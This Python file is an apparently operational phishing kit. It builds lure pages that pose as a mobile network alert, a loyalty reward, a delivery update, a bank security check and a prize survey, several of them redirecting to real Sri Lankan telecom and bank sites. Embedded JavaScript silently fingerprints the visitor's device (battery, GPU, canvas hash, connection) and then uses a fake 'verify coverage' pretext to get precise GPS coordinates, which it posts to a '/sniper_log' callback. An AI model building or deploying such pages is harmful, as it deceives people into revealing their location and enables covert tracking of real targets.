#!/usr/bin/env python3
"""
Phishing Payload Templates — Multi-Tier Device Intelligence Harvester
=====================================================================
Generates HTML payloads that silently capture maximum device intelligence
BEFORE requesting GPS permission. Even if user denies GPS, we still get:

Tier 1 (SILENT — no permission needed):
  - IP address (server-side)
  - User-Agent, platform, browser, screen, language, timezone
  - Connection type (wifi/cellular/4g/5g), downlink speed
  - Battery level + charging state
  - Device memory, CPU cores, GPU renderer (WebGL)
  - Touch support, max touch points (phone vs tablet vs desktop)
  - Canvas fingerprint hash
  - Installed fonts probe (privacy.resistFingerprinting bypass)

Tier 2 (PERMISSION — GPS via navigator.geolocation):
  - Precise lat/lng with accuracy radius
  - Altitude + heading + speed (if moving)

Usage:
    from phishing_payloads import get_payload
    html = get_payload("network_alert", target_id="3924", callback_url="/sniper_log")
"""

import html as html_lib
import hashlib
import time
from typing import Optional


# ---- JAVASCRIPT DEVICE INTELLIGENCE COLLECTOR ----

DEVICE_INTEL_JS = """
<script>
(function(){
    var D = {};
    
    // Tier 1: Silent collection (no permissions)
    D.ts = Date.now();
    D.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    D.tz_offset = new Date().getTimezoneOffset();
    D.lang = navigator.language;
    D.langs = navigator.languages ? navigator.languages.join(',') : '';
    D.platform = navigator.platform;
    D.ua = navigator.userAgent;
    D.vendor = navigator.vendor;
    D.screen_w = screen.width;
    D.screen_h = screen.height;
    D.screen_avail_w = screen.availWidth;
    D.screen_avail_h = screen.availHeight;
    D.pixel_ratio = window.devicePixelRatio;
    D.color_depth = screen.colorDepth;
    D.touch = 'ontouchstart' in window;
    D.max_touch = navigator.maxTouchPoints || 0;
    D.cores = navigator.hardwareConcurrency || 0;
    D.memory = navigator.deviceMemory || 0;
    D.online = navigator.onLine;
    D.cookies = navigator.cookieEnabled;
    D.dnt = navigator.doNotTrack;
    D.pdf = !!(navigator.mimeTypes && navigator.mimeTypes['application/pdf']);
    
    // Connection info (Network Information API)
    if (navigator.connection) {
        var c = navigator.connection;
        D.conn_type = c.effectiveType || '';   // 4g, 3g, 2g, slow-2g
        D.conn_downlink = c.downlink || 0;      // Mbps
        D.conn_rtt = c.rtt || 0;                // ms
        D.conn_savedata = c.saveData || false;
    }
    
    // Battery
    if (navigator.getBattery) {
        navigator.getBattery().then(function(b) {
            D.battery_level = Math.round(b.level * 100);
            D.battery_charging = b.charging;
            D.battery_time = b.chargingTime;
            sendData();
        }).catch(function(){ sendData(); });
    } else {
        sendData();
    }
    
    // WebGL GPU fingerprint
    try {
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            if (dbg) {
                D.gpu_vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
                D.gpu_renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            }
        }
    } catch(e) {}
    
    // Canvas fingerprint (32-bit hash)
    try {
        var cv = document.createElement('canvas');
        cv.width = 200; cv.height = 50;
        var ctx = cv.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
        D.canvas_fp = cv.toDataURL().slice(-32);
    } catch(e) {}
    
    // Tier 2: GPS (permission required)
    function requestGPS() {
        if (!navigator.geolocation) { D.gps_error = 'unsupported'; sendData(); return; }
        
        document.getElementById('msg').innerText = 'Verifying your network coverage...';
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                D.lat = pos.coords.latitude;
                D.lng = pos.coords.longitude;
                D.accuracy = pos.coords.accuracy;
                D.altitude = pos.coords.altitude;
                D.heading = pos.coords.heading;
                D.speed = pos.coords.speed;
                D.gps = true;
                sendData();
                document.getElementById('msg').innerText = 'Verification complete. Redirecting...';
                setTimeout(function(){ redirect(); }, 2000);
            },
            function(err) {
                D.gps = false;
                D.gps_error = err.message;
                D.gps_code = err.code;
                sendData();
                document.getElementById('msg').innerText = 'Verification complete. Thank you.';
                setTimeout(function(){ redirect(); }, 2000);
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    }
    
    function redirect() {
        window.location.href = 'REDIRECT_URL';
    }
    
    function sendData() {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'CALLBACK_URL', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(D));
        } catch(e) {}
    }
    
    window._requestGPS = requestGPS;
    window._sendData = sendData;
    
    // Auto-send Tier 1 after battery resolves (or 2s timeout)
    setTimeout(function() { sendData(); }, 2000);
})();
</script>
"""


# ---- PHISHING PAGE TEMPLATES ----

TEMPLATES = {
    "network_alert": {
        "title": "Network Service Alert",
        "heading": "Important Network Update",
        "body": "We need to verify your network coverage to complete the activation of your data plan.",
        "button": "Verify Coverage",
        "color": "#dc3545",
        "redirect": "https://www.dialog.lk",
    },
    "reward": {
        "title": "Loyalty Reward",
        "heading": "Congratulations! You Have a Reward",
        "body": "Your loyalty reward is ready to be claimed. Please verify your location to proceed.",
        "button": "Claim Reward",
        "color": "#28a745",
        "redirect": "https://www.dialog.lk/rewards",
    },
    "delivery": {
        "title": "Delivery Tracking",
        "heading": "Package Delivery Update",
        "body": "Your package is nearby. Please confirm your location for accurate delivery.",
        "button": "Confirm Location",
        "color": "#ff6600",
        "redirect": "https://www.trackingmore.com",
    },
    "bank_verify": {
        "title": "Security Verification",
        "heading": "Account Security Check",
        "body": "We detected unusual activity on your account. Please verify your identity to secure your account.",
        "button": "Verify Now",
        "color": "#0066cc",
        "redirect": "https://www.sampath.lk",
    },
    "survey": {
        "title": "Quick Survey - Win Prize",
        "heading": "You've Been Selected!",
        "body": "Complete this 30-second survey to win a Rs. 5,000 gift card. Location verification required.",
        "button": "Start Survey",
        "color": "#9b59b6",
        "redirect": "https://www.google.com",
    },
}


def get_payload(
    template: str = "network_alert",
    target_id: str = "0000",
    callback_url: str = "/sniper_log",
    redirect_url: Optional[str] = None,
) -> str:
    """Generate a complete phishing HTML page with device intelligence collection."""

    tmpl = TEMPLATES.get(template, TEMPLATES["network_alert"])
    redir = redirect_url or tmpl["redirect"]

    js = DEVICE_INTEL_JS.replace("CALLBACK_URL", callback_url).replace(
        "REDIRECT_URL", redir
    )

    return f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{html_lib.escape(tmpl['title'])}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
               background: #f5f5f5; display: flex; justify-content: center; align-items: center;
               min-height: 100vh; padding: 20px; }}
        .card {{ background: white; border-radius: 16px; padding: 40px 30px; max-width: 420px;
                 width: 100%; box-shadow: 0 10px 40px rgba(0,0,0,0.1); text-align: center; }}
        .icon {{ width: 64px; height: 64px; margin: 0 auto 20px; border-radius: 50%;
                 background: {tmpl['color']}15; display: flex; align-items: center;
                 justify-content: center; }}
        .icon svg {{ width: 32px; height: 32px; fill: {tmpl['color']}; }}
        h2 {{ color: #1a1a1a; font-size: 22px; margin-bottom: 12px; }}
        p {{ color: #666; font-size: 15px; line-height: 1.5; margin-bottom: 24px; }}
        .btn {{ background: {tmpl['color']}; color: white; border: none; padding: 14px 32px;
                font-size: 16px; border-radius: 10px; cursor: pointer; width: 100%;
                font-weight: 600; transition: opacity 0.2s; }}
        .btn:hover {{ opacity: 0.9; }}
        .btn:active {{ transform: scale(0.98); }}
        #msg {{ color: #888; font-size: 13px; margin-top: 16px; min-height: 20px; }}
        .spinner {{ display: none; margin: 16px auto; width: 32px; height: 32px;
                    border: 3px solid #eee; border-top-color: {tmpl['color']};
                    border-radius: 50%; animation: spin 0.8s linear infinite; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .footer {{ margin-top: 24px; font-size: 11px; color: #bbb; }}
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
        </div>
        <h2>{html_lib.escape(tmpl['heading'])}</h2>
        <p>{html_lib.escape(tmpl['body'])}</p>
        <button class="btn" id="verifyBtn" onclick="startVerify()">{html_lib.escape(tmpl['button'])}</button>
        <div class="spinner" id="spinner"></div>
        <p id="msg"></p>
        <div class="footer">Secure verification • ID: {html_lib.escape(target_id)}</div>
    </div>
    {js}
    <script>
    function startVerify() {{
        document.getElementById('verifyBtn').style.display = 'none';
        document.getElementById('spinner').style.display = 'block';
        document.getElementById('msg').innerText = 'Initializing secure check...';
        // Small delay to feel real, then request GPS
        setTimeout(function() {{ window._requestGPS(); }}, 800);
    }}
    </script>
</body>
</html>"""


def list_templates() -> list:
    """Return available template names and descriptions."""
    return [
        {"name": k, "title": v["title"], "button": v["button"]}
        for k, v in TEMPLATES.items()
    ]


# ---- CLI ----
if __name__ == "__main__":
    print("Available phishing templates:\n")
    for t in list_templates():
        print(f"  [{t['name']}] {t['title']} — Button: \"{t['button']}\"")

    print(f"\nGenerating sample 'network_alert' payload...")
    html_out = get_payload("network_alert", target_id="TEST", callback_url="/sniper_log")
    out_file = "/tmp/phish_test.html"
    with open(out_file, "w") as f:
        f.write(html_out)
    print(f"Written to {out_file} ({len(html_out)} bytes)")
